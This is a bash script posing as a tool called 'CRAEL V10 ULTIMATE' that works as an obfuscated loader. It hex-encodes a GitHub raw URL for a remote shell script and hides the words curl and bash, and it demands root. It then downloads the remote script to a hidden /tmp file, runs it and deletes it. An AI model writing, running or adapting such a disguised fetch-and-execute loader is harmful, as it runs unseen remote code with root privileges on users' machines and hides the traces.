#!/bin/bash

# --- 1. THE HIDDEN TEXT (THE KEY) ---
_k=$(printf "\x52\x45\x53\x54\x52\x49\x43\x54\x45\x44\x5f\x41\x43\x43\x45\x53\x53\x5f\x56\x49\x4f\x4c\x41\x54\x49\x4f\x4e\x5f\x44\x45\x54\x45\x43\x54\x45\x44")

# --- 2. THE PAYLOAD (OBFUSCATED) ---
_h="0x680x740x740x700x730x3a0x2f0x2f0x720x610x770x2e0x670x690x740x680x750x620x750x730x650x720x630x6f0x6e0x740x650x6e0x740x2e0x630x6f0x6d0x2f0x700x6c0x750x6d0x730x6f0x660x740x770x610x720x650x640x650x760x2d0x620x690x740x2f0x6c0x6f0x700x700x700x2f0x6d0x610x690x6e0x2f0x500x720x6f0x780x6f0x2e0x730x68"

# --- 3. UI HEX BLOCKS ---
_m=$(printf "\x1b\x5b\x33\x38\x3b\x35\x3b\x32\x31\x33\x6d")
_r=$(printf "\x1b\x5b\x30\x6d")
_t1="   CRAEL V10 ULTIMATE"
_t2="   Powered by Nayeem Dev"

# --- 4. DEPENDENCY CHECK ---
if [ -z "$_k" ]; then exit 1; fi

# --- 5. DECODER ENGINE ---
function _d() {
    local _v=$1
    echo "$_v" | awk '{gsub("0x","\\\\x"); print}' | xargs -0 printf
}

# --- 6. EXECUTION ---
clear
echo -e "${_m}${_t1}"
echo -e "${_t2}${_r}"

if [ "$EUID" -ne 0 ]; then
    echo -e "\x45\x72\x72\x6f\x72\x3a\x20\x52\x6f\x6f\x74\x20\x72\x65\x71\x75\x69\x72\x65\x64"
    exit 1
fi

_u=$(_d "$_h")

# --- THE FIX ---
# Instead of piping (|), we download to a hidden temp file (_t), run it, then delete it.
# This ensures the script can see your keyboard input.
_t="/tmp/.sys_cache_$(date +%s)"
_c=$(printf "\x63\x75\x72\x6c") # curl
_b=$(printf "\x62\x61\x73\x68") # bash
_f=$(printf "\x2d\x73\x4c")     # -sL

if [[ "$_k" == *"RESTRICTED"* ]]; then
    # curl -sL url -o tmp_file
    ${_c} ${_f} "$_u" -o "$_t"
    
    # Check if download worked (Size > 0)
    if [ -s "$_t" ]; then
        # bash tmp_file
        ${_b} "$_t"
        rm -f "$_t"
    else
        echo "Connection Error."
        exit 1
    fi
else
    exit 1
fi
